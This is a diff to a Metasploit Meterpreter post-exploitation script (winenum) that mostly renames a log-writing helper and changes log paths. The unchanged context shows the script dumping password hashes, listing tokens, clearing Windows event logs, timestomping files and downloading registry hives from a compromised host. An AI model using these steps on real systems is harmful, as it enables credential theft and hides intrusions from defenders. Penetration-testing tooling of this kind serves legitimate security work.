@@ -1,5 +1,7 @@
 # $Id$
-
+# $Revision$
+# Author: Carlos Perez at carlos_perez[at]darkoperator.com
+#-------------------------------------------------------------------------------
 ################## Variable Declarations ##################
 @client = client
 opts = Rex::Parser::Arguments.new(
@@ -37,10 +39,10 @@ opts.parse(args) { |opt, idx, val|
 host,port = @client.tunnel_peer.split(':')
 info = @client.sys.config.sysinfo
 # Create Filename info to be appended to downloaded files
-filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+"-"+sprintf("%.5d",rand(100000))
+filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory, 'winenum', info['Computer'] + filenameinfo )
+logs = ::File.join(Msf::Config.log_directory,'scripts', 'winenum',info['Computer'] + filenameinfo)
 @logfol = logs
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
@@ -188,7 +190,7 @@ def findprogs()
 		end
 
 	end
-	filewrt("#{@logfol}/programs_list.csv",proglist)
+	file_local_write("#{@logfol}/programs_list.csv",proglist)
 end
 # Function to check if Target Machine a VM
 # Note: will add soon Hyper-v and Citrix Xen check.
@@ -258,7 +260,7 @@ def list_exec(cmdlst)
 					r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
 					while(d = r.channel.read)
 						cmdout << d
-						filewrt("#{@logfol}/#{cmd.gsub(/(\W)/,"_")}.txt",cmdout)
+						file_local_write("#{@logfol}/#{cmd.gsub(/(\W)/,"_")}.txt",cmdout)
 					end
 					cmdout = ""
 					r.channel.close
@@ -352,7 +354,7 @@ def gethash()
 		print_status("\tPayload may be running with insuficient privileges!")
 	end
 	flname = "#{@logfol}/hashdump.txt"
-	filewrt(flname,hash)
+	file_local_write(flname,hash)
 
 end
 #-------------------------------------------------------------------------------
@@ -394,7 +396,7 @@ def listtokens()
 	rescue ::Exception => e
 		print_status("Error Getting Tokens: #{e.class} #{e}")
 	end
-	filewrt("#{@logfol}/tokens.txt",dt)
+	file_local_write("#{@logfol}/tokens.txt",dt)
 end
 #-------------------------------------------------------------------------------
 # Function for clearing all event logs
@@ -413,7 +415,7 @@ def clrevtlgs()
 			print_status("\tClearing the #{evl} Event Log")
 			log = @client.sys.eventlog.open(evl)
 			log.clear
-			filewrt(@dest,"Cleared the #{evl} Event Log")
+			file_local_write(@dest,"Cleared the #{evl} Event Log")
 		end
 		print_status("All Event Logs have been cleared")
 	rescue ::Exception => e
@@ -435,7 +437,7 @@ def chmace(cmds)
 			fl2clone = windir + "\\system32\\chkdsk.exe"
 			print_status("\tChanging file MACE attributes on #{filetostomp}")
 			@client.priv.fs.set_file_mace_from_file(filetostomp, fl2clone)
-			filewrt(@dest,"Changed MACE of #{filetostomp}")
+			file_local_write(@dest,"Changed MACE of #{filetostomp}")
 		rescue ::Exception => e
 			print_status("Error changing MACE: #{e.class} #{e}")
 		end
@@ -477,7 +479,7 @@ def regdump(pathoflogs,filename)
 		begin
 			print_status("\tDownloading #{hive}#{filename}.cab to -> #{pathoflogs}/#{host}-#{hive}#{filename}.cab")
 			@client.fs.file.download_file("#{pathoflogs}/#{host}-#{hive}#{filename}.cab", "#{windir}\\Temp\\#{hive}#{filename}.cab")
-			filewrt(@dest,"Dumped and Downloaded #{hive} Registry Hive")
+			file_local_write(@dest,"Dumped and Downloaded #{hive} Registry Hive")
 			sleep(5)
 		rescue ::Exception => e
 			print_status("Error Downloading Registry Hives #{e.class} #{e}")
@@ -500,17 +502,7 @@ def covertracks(cmdstomp)
 		chmace(cmdstomp)
 	end
 end
-#-------------------------------------------------------------------------------
-# Function for writing results of other functions to a file
-def filewrt(file2wrt, data2wrt)
-	output = ::File.open(file2wrt, "a")
-	if data2wrt
-		data2wrt.each_line do |d|
-			output.puts(d)
-		end
-	end
-	output.close
-end
+
 #-------------------------------------------------------------------------------
 # Functions Provided by natron (natron 0x40 invisibledenizen 0x2E com)
 # for Process Migration
@@ -594,7 +586,7 @@ def uaccheck()
 			end
 		end
 	end
-	filewrt(@dest,"UAC is Enabled")
+	file_local_write(@dest,"UAC is Enabled")
 	return uac
 end
 ################## MAIN ##################
@@ -617,8 +609,8 @@ header << "OS:         #{info['OS']}\n"
 header << "\n\n\n"
 print_status("Saving general report to #{@dest}")
 print_status("Output of each individual command is saved to #{@logfol}")
-filewrt(@dest,header)
-filewrt(@dest,chkvm())
+file_local_write(@dest,header)
+file_local_write(@dest,chkvm())
 trgtos = info['OS']
 uac = uaccheck()
 # Run Commands according to OS some commands are not available on all versions of Windows
